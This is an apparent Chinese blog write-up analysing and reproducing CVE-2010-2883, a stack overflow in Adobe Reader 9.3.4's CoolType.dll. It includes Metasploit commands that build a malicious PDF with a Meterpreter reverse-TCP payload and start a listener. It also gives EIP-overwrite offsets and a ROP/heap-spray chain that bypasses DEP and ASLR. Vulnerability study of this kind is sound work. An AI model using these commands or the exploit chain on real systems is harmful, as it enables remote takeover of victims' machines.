---
layout:         post
title:          CVE-2010-2883分析 & 复现
author:         wooy0ung
tags:           msf
category:  	exploit
---


>[分析环境]  
>系统: Windows XP SP3  
>漏洞软件: Adobe Reader 9.3.4  
>注意: 在Win7 x64下从Reader打开msf.pdf会引起异常而退出。  
>说明: 这篇文算是《漏洞战争》上的补充吧, 有些细节作者没有讲明。
<!-- more -->


### 0x00 前期准备

安装 Adobe Reader 9 & PdfStreamDumper, 将CoolType.dll拖到IDA分析, 定位到漏洞点

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x00.png)

第一处脆弱点, strcat没对字符串长度进行检查, 导致栈溢出

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x01.png)

第二处脆弱点在0x0808B308, call [eax]导致可以构造任意call, 控制eip的指向


### 0x01 Dump TTF

生成恶意pdf

```
msf > use exploit/windows/fileformat/adobe_cooltype_sing
msf > set payload windows/meterpreter/reverse_tcp
msf > set lhost 192.168.2.63
msf > set lport 9000
msf > run
```

导入pdf, Search_For->TTF Fonts, 选中TTF数据右键->Save Decompressed Stream

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x02.png)

TableEntry结构

```
typedef struct_SING
{
        char    tag[4];
        ULONG   checkSum;
        ULONG   offset;
        ULONG   length;
} TableEntry;
```

Dump数据0x0EC处的SING字段标记SING表的表头

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x03.png)

偏移表头0x00C处表示SING表数据相对文件的偏移(0x000->0x11C)

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x04.png)

相对于SING表数据开始再偏移0x010(uniqueName)开始复制到栈上


### 0x02 调试

定位到strcat, 查看payload入栈的首地址

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x05.png)

此处数据与dump出来的一致, 确定payload在栈首地址0x0012E4D8

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x06.png)

注意这几处调用0x0803DEAF->0x08016C56->0x0801BB41->0x0808B308, 定位到call [eax]

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x07.png)

这时调用的是栈上0x0012E6D0存的一个地址, 0x0012E6D0-0x0012E4D8=0x1F8

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x08.png)

将偏移payload的0x1F8~0x1FC共4bytes修改成目的地址(此处为0x4A80CB38), 即可控制EIP跳转, 然后构造ROP

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x09.png)

偏移payload的0x008~0x00C修改成ROP指令地址, 0x00C~0x00F修改成0x0C0C0C0C

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x0a.png)

通过HeapSpray将shellcode弹到栈上

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x0b.png)

构造ROP, 依次调用CreateFileA->CreateFileMappingA->MapViewOfFile->memcpy将栈上的shellcode复制到有r-w-x权限的内存段


### 0x03 exploit

打开msf监听, F9直接运行

```
msf > use /exploit/mutil/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set lhost 192.168.2.63
msf > set lport 9000
msf > exploit -j
```

后门已经反弹回来

![](/assets/img/exploit/2017-09-23-cve-2010-2883/0x0c.png)

由于icucnv36.dll没有开启ASLR, 以上构造的ROP指令能绕过DEP、ASLR